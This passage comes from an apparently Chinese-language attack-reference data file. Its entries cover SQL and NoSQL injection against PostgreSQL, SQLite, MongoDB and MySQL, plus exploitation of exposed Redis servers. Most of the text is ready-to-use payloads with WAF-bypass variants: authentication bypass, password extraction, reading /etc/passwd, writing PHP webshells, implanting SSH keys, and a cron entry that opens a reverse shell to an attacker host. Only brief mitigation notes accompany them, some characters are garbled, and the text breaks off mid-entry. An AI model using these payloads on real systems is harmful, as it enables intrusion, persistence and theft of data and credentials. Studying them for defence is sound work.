          { part: 'information_schema.tables', explanation: '标准表信息视图' },
          { part: 'table_schema', explanation: '模式名，public是默认模式' }
        ]
      },
      { 
        title: '4. 获取列名', 
        command: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", 
        description: '获取列名', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'UNION', explanation: '合并查询结果集', type: 'keyword' },
          { part: 'SELECT', explanation: '查询数据', type: 'keyword' },
          { part: 'FROM information_schema', explanation: '指定数据表', type: 'value' },
          { part: 'WHERE', explanation: '条件过滤', type: 'keyword' }
        ]
      },
      { 
        title: '5. 读取文件', 
        command: "' UNION SELECT pg_read_file('/etc/passwd'),NULL--\n' UNION SELECT pg_read_binary_file('/etc/passwd'),NULL--", 
        description: '使用pg_read_file读取文件', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'pg_read_file()', explanation: 'PostgreSQL读取文本文件' },
          { part: 'pg_read_binary_file()', explanation: '读取二进制文件' }
        ]
      },
      { 
        title: '6. 写入文件', 
        command: "' UNION SELECT 'test',COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/html/shell.php'--", 
        description: '使用COPY写入文件', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'COPY', explanation: 'PostgreSQL COPY命令' },
          { part: 'TO', explanation: '指定输出文件' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '编码绕过', 
        command: "' UNION SELECT chr(60)||chr(63)||'php system($_GET[c]);'||chr(63)||chr(62),NULL--", 
        description: '使用chr函数编码', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'chr()', explanation: '返回ASCII字符' }
        ]
      }
    ],
    tutorial: {
      overview: 'PostgreSQL注入与其他数据库类似，但有其特有的函数和语法。PostgreSQL提供了丰富的文件操作函数。',
      vulnerability: 'PostgreSQL注入利用其丰富的类型转换系统和函数库：通过CAST/类型转换触发报错回显，利用pg_sleep()实现延时盲注，COPY TO/FROM进行文件读写操作，以及通过PL/pgSQL创建自定义函数执行系统命令。',
      exploitation: '完�利用流程：\n1. 探测注入点\n2. 获取数据库信息\n3. 枚举表和列\n4. 使用pg_read_file读取文件\n5. 使用COPY写入WebShell',
      mitigation: '防御措施：\n1. 使用参数化查询\n2. 禁用pg_read_file等函数\n3. 最小权限原则',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'sqli-sqlite-basic',
    name: 'SQLite注入',
    description: 'SQLite数据库注入攻击',
    category: 'SQL/NoSQL注入',
    subCategory: 'SQLite',
    tags: ['sqli', 'sqlite'],
    prerequisites: ['SQLite数据库', '存在注入点'],
    execution: [
      { 
        title: '1. 探测注入点', 
        command: `' OR 1=1--
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--`,
        description: '探测注入点', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '\' OR 1=1--', explanation: '探测载荷', type: 'value' },
          { part: 'OR', explanation: '关键参数', type: 'value' },
          { part: '1--', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '2. 获取版本', 
        command: `' UNION SELECT sqlite_version(),NULL--`, 
        description: '获取SQLite版本', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'sqlite_version()', explanation: 'SQLite版本函数' }
        ]
      },
      { 
        title: '3. 获取表名', 
        command: `' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--`, 
        description: '获取所有表名', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'UNION', explanation: '合并查询结果集', type: 'keyword' },
          { part: 'SELECT', explanation: '查询数据', type: 'keyword' },
          { part: 'FROM sqlite_master', explanation: '指定数据表', type: 'value' },
          { part: 'WHERE', explanation: '条件过滤', type: 'keyword' }
        ]
      },
      { 
        title: '4. 获取表结构', 
        command: `' UNION SELECT sql,NULL FROM sqlite_master WHERE name='users'--`, 
        description: '获取建表语句', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'sql', explanation: '建表SQL语句' }
        ]
      },
      { 
        title: '5. 读取文件', 
        command: `' UNION SELECT load_extension('libsqlite3.so'),NULL--
' UNION SELECT readfile('/etc/passwd'),NULL--`, 
        description: '读取文件(需要扩展)', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'load_extension', explanation: '加载扩展库' },
          { part: 'readfile', explanation: '读取文件(需扩展)' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: 'SQLite字符编码绕过', 
        command: `' UNION SELECT CHAR(116,101,115,116),NULL--
' UNION SELECT X'746573746461746131',NULL--
' AND typeof(CASE WHEN unicode(substr((SELECT name FROM sqlite_master LIMIT 1),1,1))>96 THEN 1 ELSE 0.0 END)='integer'--`, 
        description: '使用CHAR()函数构造字符串、X前缀十六进制字面量、typeof()和unicode()进行类型推断盲注绕过WAF', 
        syntaxBreakdown: [
          { part: 'UNION', explanation: '合并查询结果集', type: 'keyword' },
          { part: 'SELECT', explanation: '查询数据', type: 'keyword' },
          { part: 'FROM sqlite_master', explanation: '指定数据表', type: 'value' },
          { part: '--', explanation: 'SQL单行注释', type: 'operator' }
        ]
      },
      { 
        title: 'SQLite运算符与函数替代', 
        command: `' AND (SELECT name FROM sqlite_master WHERE type='table' AND name LIKE '%user%')--
' AND (SELECT name FROM sqlite_master WHERE type='table' AND name GLOB '*user*')--
' UNION SELECT replace(group_concat(name,','),'_',''),NULL FROM sqlite_master WHERE type='table'--
' AND instr((SELECT sql FROM sqlite_master LIMIT 1),'password')>0--`, 
        description: '使用LIKE/GLOB模式匹配替代等号、instr()替代SUBSTRING、group_concat配合replace混淆数据', 
        syntaxBreakdown: [
          { part: 'GLOB', explanation: 'Unix风格模式匹配，大小写敏感' },
          { part: 'instr()', explanation: '查找子字符串位置，替代SUBSTRING' },
          { part: 'replace()', explanation: '字符串替换函数混淆输出' }
        ]
      }
    ],
    tutorial: {
      overview: 'SQLite是嵌入式数据库引擎，广泛用于移动应用、桌面软件和小型Web应用。其注入测试需要了解SQLite特有的语法和系统表(sqlite_master)结构。',
      vulnerability: 'SQLite注入的特殊性在于：通过sqlite_master表枚举所有表和视图定义，使用typeof()确定列类型，利用group_concat()聚合多行数据，ATTACH DATABASE可创建新数据库文件实现写文件操作。',
      exploitation: 'SQLite注入利用步骤：1)通过sqlite_master获取表结构 2)使用UNION SELECT提取数据 3)利用ATTACH DATABASE写入webshell到可访问目录 4)或通过load_extension()加载恶意共享库执行代码。',
      mitigation: '防御SQLite注入：使用参数化查询(PreparedStatement)，严格验证和过滤用户输入，限制数据库文件权限防止ATTACH操作，禁用load_extension()功能，将数据库文件存放在Web根目录之外。',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'sqli-mongodb-basic',
    name: 'MongoDB注入',
    description: 'NoSQL数据库注入攻击技术',
    category: 'SQL/NoSQL注入',
    subCategory: 'MongoDB',
    tags: ['nosql', 'mongodb', 'injection'],
    prerequisites: ['目标使用MongoDB', '存在用户输入拼接查询'],
    execution: [
      { 
        title: '1. 探测注入点', 
        command: '{"username": "admin", "password": "password"}\n{"username": "admin", "password": {"$ne": ""}}\n{"username": "admin", "password": {"$gt": ""}}', 
        description: '探测MongoDB注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '$ne', explanation: '不等于操作符' },
          { part: '$gt', explanation: '大于操作符' }
        ]
      },
      { 
        title: '2. 绕过认证', 
        command: '{"username": "admin", "password": {"$ne": "wrongpass"}}\n{"username": {"$ne": ""}, "password": {"$ne": ""}}', 
        description: '绕过登录认证', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '$ne', explanation: '不等于，返回所有密码不为wrongpass的用户' }
        ]
      },
      { 
        title: '3. 逻辑运算注入', 
        command: '{"username": "admin", "password": {"$or": [{"password": "realpass"}, {"1": "1"}]}}', 
        description: '使用$or逻辑运算', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '$or', explanation: '或运算符' }
        ]
      },
      { 
        title: '4. 正则注入', 
        command: '{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}', 
        description: '正则表达式注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '$regex', explanation: '正则匹配操作符' },
          { part: '^admin', explanation: '以admin开�' }
        ]
      },
      { 
        title: '5. $where注入', 
        command: '{"$where": "this.username == \'admin\' && this.password.match(/.*/)"}', 
        description: '$where子句JavaScript注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '$where', explanation: '执行JavaScript代码' },
          { part: 'this.username', explanation: '当前文档的字段' }
        ]
      },
      { 
        title: '6. 盲注提取数据', 
        command: '{"username": {"$regex": "^a"}}\n{"username": {"$regex": "^ad"}}\n{"username": {"$regex": "^adm"}}\n逐字符枚举用户名',
            syntaxBreakdown: [
              { part: '{"username":', explanation: '命令/载荷起始', type: 'command' },
              { part: ' {"$regex": "^a"}}\n{"username": {"$regex": "^ad"}}\n{"username": {"$regex": "^adm"}}\n逐字符枚举用户名', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '使用正则逐字符提取', 
        },
      ],
    wafBypass: [
      { 
        title: 'Unicode绕过', 
        command: '{"username": {"\\u0024ne": ""}}\n使用Unicode编码$符号', 
        description: 'Unicode编码绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '\\u0024', explanation: '$的Unicode编码' }
        ]
      }
    ],
    tutorial: {
      overview: 'MongoDB是最流行的NoSQL数据库之一，其查询使用JSON格式而非SQL语法。NoSQL注入通过操纵查询运算符($gt/$ne/$regex等)来绕过认证或提取数据，攻击面与传统SQL注入截然不同。',
      vulnerability: 'MongoDB注入利用JSON查询运算符绕过认证：$ne(不等于)绕过密码验证、$gt(大于)匹配任意值、$regex进行正则盲注提取数据、$where注入JavaScript代码执行服务端脚本，以及聚合管道注入进行复杂数据操作。',
      exploitation: '完�利用流程：\n1. 探测注入点\n2. 使用操作符绕过认证\n3. 使用正则逐字符提取数据\n4. 尝试$where执行JavaScript',
      mitigation: '防御措施：\n1. 使用参数化查询\n2. 输入验证\n3. 禁用$where操作符\n4. 最小权限原则',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'sqli-redis',
    name: 'Redis未授权访问',
    description: 'Redis未授权访问和命令注入',
    category: 'SQL/NoSQL注入',
    subCategory: 'Redis',
    tags: ['redis', 'nosql', 'injection'],
    prerequisites: ['Redis服务可访问', '未授权或弱密码'],
    execution: [
      { 
        title: '1. 探测Redis', 
        command: `redis-cli -h target.com ping
redis-cli -h target.com info`, 
        description: '探测Redis服务', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'redis-cli', explanation: 'Redis命令行客户端' },
          { part: 'ping', explanation: '测试连接' },
          { part: 'info', explanation: '获取服务器信息' }
        ]
      },
      { 
        title: '2. 未授权访问', 
        command: `redis-cli -h target.com
> INFO
> KEYS *
> GET sensitive_key`, 
        description: '未授权访问Redis', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'INFO', explanation: '获取Redis信息' },
          { part: 'KEYS *', explanation: '列出所有键' }
        ]
      },
      { 
        title: '3. 写入Webshell', 
        command: `redis-cli -h target.com
> CONFIG SET dir /var/www/html/
> CONFIG SET dbfilename shell.php
> SET shell "<?php system($_GET['cmd']); ?>"
> SAVE`, 
        description: '写入Webshell', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'CONFIG SET dir', explanation: '设置RDB文件保存目录' },
          { part: 'CONFIG SET dbfilename', explanation: '设置RDB文件名' },
          { part: 'SAVE', explanation: '保存数据库到文件' }
        ]
      },
      { 
        title: '4. 写入SSH公钥', 
        command: `redis-cli -h target.com
> CONFIG SET dir /root/.ssh/
> CONFIG SET dbfilename authorized_keys
> SET sshkey "ssh-rsa AAAA..."
> SAVE`,
            syntaxBreakdown: [
              { part: 'redis-cli -h target.com', explanation: '第1步操作', type: 'command' },
              { part: '> CONFIG SET dir /root/.ssh/', explanation: '第2步操作', type: 'value' },
              { part: '> CONFIG SET dbfilename authorized_keys', explanation: '第3步操作', type: 'value' },
              { part: '> SET sshkey "ssh-rsa AAAA..."', explanation: '第4步操作', type: 'value' },
              { part: '> SAVE', explanation: '第5步操作', type: 'value' }
            ],
        description: '写入SSH公钥', 
        platform: 'linux',
      },
      { 
        title: '5. 写入Cron任务', 
        command: `redis-cli -h target.com
> CONFIG SET dir /var/spool/cron/
> CONFIG SET dbfilename root
> SET cron "\\n\\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1\\n\\n"
> SAVE`, 
        description: '写入Cron任务', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: '/var/spool/cron/', explanation: 'Cron任务目录' },
          { part: '*/1 * * * *', explanation: '每分钟执行' }
        ]
      },
      { 
        title: '6. 主从复制RCE', 
        command: `使用redis-rogue-server工具:
python redis-rogue-server.py --rhost target.com --lhost attacker.com
通过主从复制加载恶意模块执行命令`,
            syntaxBreakdown: [
              { part: '使用redis-rogue-server工具:', explanation: '第1步操作', type: 'command' },
              { part: 'python redis-rogue-server.py --rhost target.com --lhost attacker.com', explanation: '第2步操作', type: 'value' },
              { part: '通过主从复制加载恶意模块执行命令', explanation: '第3步操作', type: 'value' }
            ],
        description: '主从复制RCE', 
        platform: 'linux',
      }
    ],
    wafBypass: [
      { 
        title: 'Redis命令混淆绕过', 
        command: `redis-cli -h target.com
> "C""O""N""F""I""G" SET dir /var/www/html/
> $(printf 'CONF')$(printf 'IG') SET dbfilename shell.php
> SET shell "<?php system(\\$_GET['cmd']); ?>"
> SAVE`, 
        description: '使用引号分割命令字符串、拼接变量等方式混淆Redis命令绕过WAF检测', 
        syntaxBreakdown: [
          { part: '"C""O""N""F""I""G"', explanation: 'Redis协议中引号分割的命令仍可执行' },
          { part: '$(printf)', explanation: 'Shell变量拼接绕过命令关键字检测' }
        ]
      },
      { 
        title: 'Redis Lua脚本执行绕过', 
        command: `redis-cli -h target.com
> EVAL "redis.call('set','shell','<?php system(\\$_GET[c]); ?>')" 0
> EVAL "redis.call('config','set','dir','/var/www/html/')" 0
> EVAL "redis.call('config','set','dbfilename','test.php')" 0
> EVAL "redis.call('save')" 0`, 
        description: '通过EVAL执行Lua脚本间接调用Redis命令，绕过对CONFIG/SET等直接命令的检测', 
        syntaxBreakdown: [
          { part: 'EVAL', explanation: '执行Lua脚本的Redis命令' },
          { part: 'redis.call()', explanation: 'Lua中调用Redis命令的函数' },
          { part: '0', explanation: 'EVAL命令的key数量参数' }
        ]
      }
    ],
    tutorial: {
      overview: 'Redis是高性能的键值对存储系统，常被用作缓存和消息队列。Redis注入通过CRLF注入或未授权访问执行任意Redis命令，可导致数据泄露、写入webshell甚至通过主从复制RCE。',
      vulnerability: 'Redis漏洞主要包括：未授权访问(默认无密码)导致任意命令执行，CRLF注入将恶意Redis命令注入合法请求中，CONFIG SET修改持久化路径写入crontab或SSH公钥，以及通过主从复制加载恶意模块实现RCE。',
      exploitation: '完�利用流程：\n1. 探测Redis服务\n2. 尝试未授权访问\n3. 写入Webshell/SSH公钥/Cron任务\n4. 或使用主从复制RCE',
      mitigation: '防御措施：\n1) 设置强密码\n2) 绑定内网IP\n3) 禁用CONFIG命令\n4) 使用普通用户运行Redis',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'sqli-blind',
    name: '布尔盲注',
    description: '基于布尔条件的SQL盲注技术',
    category: 'SQL/NoSQL注入',
    subCategory: '盲注',
    tags: ['sqli', 'blind', 'boolean'],
    prerequisites: ['存在SQL注入', '页面有真/假两种不同响应'],
    execution: [
      { 
        title: '1. 确认盲注', 
        command: `' AND 1=1-- (返回正常)
' AND 1=2-- (返回异常)
确认存在布尔盲注`, 
        description: '确认布尔盲注', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'AND 1=1', explanation: '永真条件' },
          { part: 'AND 1=2', explanation: '永假条件' }
        ]
      },
      { 
        title: '2. 获取数据库名长度', 
        command: `' AND LENGTH(database())=1--
' AND LENGTH(database())=2--
...
' AND LENGTH(database())=N--
�到返回正常`, 
        description: '枚举数据库名长度', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'LENGTH()', explanation: '返回字符串长度' }
        ]
      },
      { 
        title: '3. 逐字符枚举数据库名', 
        command: `' AND ASCII(SUBSTRING(database(),1,1))>97--
' AND ASCII(SUBSTRING(database(),1,1))>100--
...
使用二分法快速定位字符`, 
        description: '逐字符提取数据库名', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'SUBSTRING(str,pos,len)', explanation: '截取子字符串' },
          { part: 'ASCII()', explanation: '返回ASCII码值' }
        ]
      },
      { 
        title: '4. 使用工具自动化', 
        command: `sqlmap -u "http://target.com?id=1" --technique=B --dbs
使用sqlmap进行布尔盲注`, 
        description: '使用sqlmap自动化', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '--technique=B', explanation: '指定布尔盲注技术' },
          { part: '--dbs', explanation: '枚举数据库' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '布尔盲注条件表达式替代', 
        command: `' AND (CASE WHEN (MID(database(),1,1)='a') THEN 1 ELSE 0 END)=1--
' AND LEFT(database(),1)>'a'--
' AND RIGHT(LEFT(database(),2),1)='d'--
' AND ORD(MID(database(),1,1))BETWEEN 97 AND 122--`, 
        description: '使用CASE WHEN替代IF()、MID()替代SUBSTRING()、LEFT/RIGHT组合截取、BETWEEN替代大于小于比较', 
        syntaxBreakdown: [
          { part: 'CASE WHEN...THEN...ELSE...END', explanation: '条件表达式替代IF函数' },
          { part: 'MID(str,pos,len)', explanation: 'SUBSTRING的同义函数' },
          { part: 'LEFT/RIGHT', explanation: '从左/右截取字符串' },
          { part: 'BETWEEN', explanation: '范围比较替代大于小于' }
        ]
      },
      { 
        title: '布尔盲注数学运算与位运算绕过', 
        command: `' AND (SELECT CONV(HEX(SUBSTR(database(),1,1)),16,10))>96--
' AND (SELECT ORD(MID(database(),1,1))&0x40)=0x40--
' AND (SELECT POW(ORD(MID(database(),1,1)),0))+0=1--
' DIV 1 AND (SELECT LENGTH(database()))>0--`, 
        description: '使用HEX/CONV进行编码比较、位与运算(&)判断字符范围、POW()数学函数混淆、DIV替代AND', 
        syntaxBreakdown: [
          { part: 'CONV(HEX(),16,10)', explanation: '将字符转为十进制数绕过ASCII检测' },
          { part: '&0x40', explanation: '位运算判断第6位（大小写字母范围）' },
          { part: 'DIV 1', explanation: '整除运算替代AND关键字' }
        ]
      }
    ],
    tutorial: {
      overview: 'SQL盲注是指注入成功但页面不直接回显数据的场景，需要通过条件判断(布尔盲注)或时间延迟(时间盲注)来逐字符推断数据，是实战中最常见的注入类型。',
      vulnerability: 'SQL盲注漏洞存在于所有未正确参数化的查询中，攻击者通过构造布尔条件(AND 1=1 vs AND 1=2)观察页面差异，或使用SLEEP/BENCHMARK等延时函数判断条件真假，逐位提取数据库中的任意信息。',
      exploitation: '完�利用流程：\n1. 确认布尔盲注存在\n2. 枚举数据长度\n3. 逐字符提取数据\n4. 使用工具自动化',
      mitigation: '防御SQL盲注：使用参数化查询/预编译语句，实施WAF规则检测异常条件语句和延时函数，监控慢查询日志发现异常SLEEP请求，设置数据库查询超时限制，以及部署RASP实时检测SQL注入行为。',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'sqli-time-based',
    name: '时�盲注',
    description: '基于时�延迟的SQL盲注技术',
    category: 'SQL/NoSQL注入',
    subCategory: '盲注',
    tags: ['sqli', 'blind', 'time'],
    prerequisites: ['存在SQL注入', '页面响应时�可控'],
    execution: [
      { 
        title: '1. 确认时�盲注', 
        command: `' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
观察响应是否延迟5秒`, 
        description: '确认时�盲注', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'SLEEP(5)', explanation: 'MySQL延时5秒' },
          { part: 'IF(cond,true,false)', explanation: '条件判断函数' }
        ]
      },
      { 
        title: '2. 获取数据库名长度', 
        command: `' AND IF(LENGTH(database())=N,SLEEP(5),0)--
枚举数据库名长度`,
        description: '枚举数据库名长度', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'AND', explanation: '关键参数', type: 'value' },
          { part: 'IF(LENGTH(database())', explanation: '关键参数', type: 'value' },
          { part: 'N,SLEEP(5),0)--', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '3. 逐字符提取', 
        command: `' AND IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(5),0)--
使用二分法提取字符`,
        description: '逐字符提取数据', 
        platform: 'all',
      },
      { 
        title: '4. 不同数据库延时函数', 
        command: `MySQL: SLEEP(5), BENCHMARK()
MSSQL: WAITFOR DELAY '0:0:5'
PostgreSQL: pg_sleep(5)
Oracle: DBMS_LOCK.SLEEP(5)`, 
        description: '各数据库延时函数', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'WAITFOR DELAY', explanation: 'MSSQL延时' },
          { part: 'pg_sleep()', explanation: 'PostgreSQL延时' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '时间延迟替代函数绕过', 
        command: `' AND BENCHMARK(5000000,SHA1('test'))--
' AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--
' AND GET_LOCK('sqli_test',5)--
' AND (CASE WHEN database() LIKE '%' THEN BENCHMARK(3000000,MD5('x')) ELSE 0 END)--`, 
        description: '使用BENCHMARK()替代SLEEP()、笛卡尔积重查询消耗时间、GET_LOCK()锁等待、CASE条件触发延时', 
        syntaxBreakdown: [
          { part: 'BENCHMARK(N,expr)', explanation: '重复执行表达式N次消耗时间' },
          { part: '笛卡尔积', explanation: '多表交叉JOIN产生海量结果消耗时间' },
          { part: 'GET_LOCK(name,timeout)', explanation: '获取命名锁，超时等待' }
        ]
      },
      { 
        title: '跨数据库时间延迟绕过', 
        command: `PostgreSQL: ' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
MSSQL: '; IF (1=1) WAITFOR DELAY '0:0:5'--
Oracle: ' AND 1=CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END--
MySQL: ' AND (SELECT SLEEP(5) FROM DUAL WHERE 1=1)--`, 
        description: '利用各数据库特有的时间延迟方法：PostgreSQL的pg_sleep条件触发、MSSQL的IF条件WAITFOR、Oracle的DBMS_PIPE.RECEIVE_MESSAGE替代DBMS_LOCK', 
        syntaxBreakdown: [
          { part: 'pg_sleep()', explanation: 'PostgreSQL延迟函数，CASE条件触发' },
          { part: 'WAITFOR DELAY', explanation: 'MSSQL延迟，用IF条件包装' },
          { part: 'DBMS_PIPE.RECEIVE_MESSAGE', explanation: 'Oracle管道等待消息，替代DBMS_LOCK.SLEEP' }
        ]
      }
    ],
    tutorial: {
      overview: 'SQL时间盲注通过注入延时函数(如SLEEP/WAITFOR/pg_sleep)来判断条件真假，适用于页面无任何可观察差异的场景，是最隐蔽但效率最低的注入方式。',
      vulnerability: 'SQL时间盲注利用数据库内置的延时功能：MySQL的SLEEP()和BENCHMARK()、MSSQL的WAITFOR DELAY、PostgreSQL的pg_sleep()、Oracle的DBMS_LOCK.SLEEP()。通过条件语句控制延时触发，逐字符推断目标数据。',
      exploitation: '完�利用流程：\n1. 确认时�盲注存在\n2. 枚举数据长度\n3. 逐字符提取\n4. 使用sqlmap自动化',
      mitigation: '防御SQL时间盲注：除参数化查询外，还应设置严格的数据库查询超时(如5秒)，监控异常慢查询模式，WAF检测SLEEP/WAITFOR/BENCHMARK等延时函数关键词，限制单IP的并发查询数量。',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'sqli-error-based',
    name: '报错注入',
    description: '利用错误信息提取数据的SQL注入',
    category: 'SQL/NoSQL注入',
    subCategory: '报错注入',
    tags: ['sqli', 'error', 'extractvalue'],
    prerequisites: ['存在SQL注入', '错误信息会显示在页面上'],
    execution: [
      { 
        title: '1. 确认报错注入', 
        command: `' AND extractvalue(1,concat(0x7e,version()))--
' AND updatexml(1,concat(0x7e,version()),1)--`, 
        description: '测试报错注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'extractvalue()', explanation: 'MySQL XML提取函数' },
          { part: 'updatexml()', explanation: 'MySQL XML�新函数' },
          { part: 'concat(0x7e,...)', explanation: '拼接波浪号标记' }
        ]
      },
      { 
        title: '2. 获取数据库信息', 
        command: `' AND extractvalue(1,concat(0x7e,database()))--
' AND extractvalue(1,concat(0x7e,user()))--
' AND extractvalue(1,concat(0x7e,version()))--`,
        description: '获取基础信息', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'AND', explanation: '关键参数', type: 'value' },
          { part: 'extractvalue(1,concat(0x7e,database()))-', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '3. 获取表名', 
        command: `' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--`,
        description: '获取表名', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'SELECT', explanation: '查询数据', type: 'keyword' },
          { part: 'FROM information_schema', explanation: '指定数据表', type: 'value' },
          { part: 'WHERE', explanation: '条件过滤', type: 'keyword' },
          { part: '--', explanation: 'SQL单行注释', type: 'operator' }
        ]
      },
      { 
        title: '4. 获取数据', 
        command: `' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 0,1)))--`,
        description: '提取数据', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'SELECT', explanation: '查询数据', type: 'keyword' },
          { part: 'FROM users', explanation: '指定数据表', type: 'value' },
          { part: '--', explanation: 'SQL单行注释', type: 'operator' },
          { part: 'CONCAT', explanation: '字符串拼接函数', type: 'function' }
        ]
      },
      { 
        title: '5. 其他报错函数', 
        command: `' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND EXP(~(SELECT * FROM (SELECT version())a))--`, 
        description: '其他报错注入方法', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'FLOOR(RAND(0)*2)', explanation: '产生重复键错误' },
          { part: 'EXP()', explanation: '数学函数溢出报错' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '替代报错函数绕过', 
        command: `' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT version())a)b))--
' AND (SELECT 1 FROM (SELECT NTILE(1) OVER(ORDER BY (SELECT version())))a)--
' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--
' AND ST_LatFromGeoHash(version())--`, 
        description: '使用GEOMETRYCOLLECTION空间函数、JSON_KEYS、ST_LatFromGeoHash等冷门函数替代extractvalue/updatexml触发报错', 
        syntaxBreakdown: [
          { part: 'GEOMETRYCOLLECTION()', explanation: '空间数据函数，参数类型不匹配触发报错' },
          { part: 'JSON_KEYS()', explanation: 'JSON函数，非法输入触发报错泄露数据' },
          { part: 'ST_LatFromGeoHash()', explanation: '地理哈希函数，非法输入报错带出数据' }
        ]
      },
      { 
        title: '编码与科学计数法绕过', 
        command: `' AND extractvalue(1,concat(0x7e,(SELECT unhex(hex(database())))))--
' AND 1=1 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7e,database(),0x7e) x)a))--
' AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.schemata GROUP BY x)a)--
' %26%26 updatexml(1,concat(0x7e,(select%20database())),1)--%20`, 
        description: '使用unhex(hex())双层编码、EXP()科学计数法溢出、URL双重编码（%26%26替代AND）绕过WAF检测', 
        syntaxBreakdown: [
          { part: 'unhex(hex())', explanation: '双层编码绕过内容检测' },
          { part: 'EXP(~(...))', explanation: '对子查询结果取反后指数运算溢出报错' },
          { part: '%26%26', explanation: 'URL编码的&&替代AND关键字' }
        ]
      }
    ],
    tutorial: {
      overview: 'SQL报错注入利用数据库错误信息直接回显数据，通过构造特定的函数调用(如updatexml/extractvalue/exp)使数据库在错误消息中输出查询结果，效率远高于盲注。',
      vulnerability: 'SQL报错注入利用数据库在处理非法输入时将内部数据暴露在错误信息中：MySQL的updatexml()/extractvalue()/exp()溢出、MSSQL的convert()/cast()类型转换错误、PostgreSQL的cast()错误，以及Oracle的XMLType()等函数。',
      exploitation: '完�利用流程：\n1. 确认报错注入存在\n2. 使用extractvalue/updatexml提取数据\n3. 枚举数据库结构\n4. 提取敏感数据',
      mitigation: '防御SQL报错注入：生产环境必须关闭详细错误信息显示(display_errors=off)，使用自定义错误页面替代默认数据库错误，记录错误日志但不向用户展示，使用参数化查询从根本上防止注入。',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'sqli-second-order',
    name: '二阶SQL注入',
    description: '存储后触发的SQL注入攻击',
    category: 'SQL/NoSQL注入',
    subCategory: '二阶注入',
    tags: ['sqli', 'second-order', 'stored'],
    prerequisites: ['存在数据存储功能', '存储数据被二次使用'],
    execution: [
      { 
        title: '1. 探测二阶注入', 
        command: `注册用户名: admin'--
或: admin' OR '1'='1
登录后查看是否影响其他功能`,
        description: '探测二阶注入点', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '注册用户名: admin\'--', explanation: '探测载荷', type: 'value' },
          { part: '注册用户名:', explanation: '关键参数', type: 'value' },
          { part: 'admin\'--', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '2. 用户名注入', 
        command: `注册用户: admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
登录触发报错注入`, 
        description: '用户名触发注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'FLOOR(RAND(0)*2)', explanation: '报错注入关键' },
          { part: 'GROUP BY x', explanation: '触发重复键错误' }
        ]
      },
      { 
        title: '3. 密码重置注入', 
        command: `输入邮箱: ' OR '1'='1
可能触发密码重置所有用户`,
        description: '密码重置功能注入', 
        platform: 'all',
        syntaxBreakdown: [
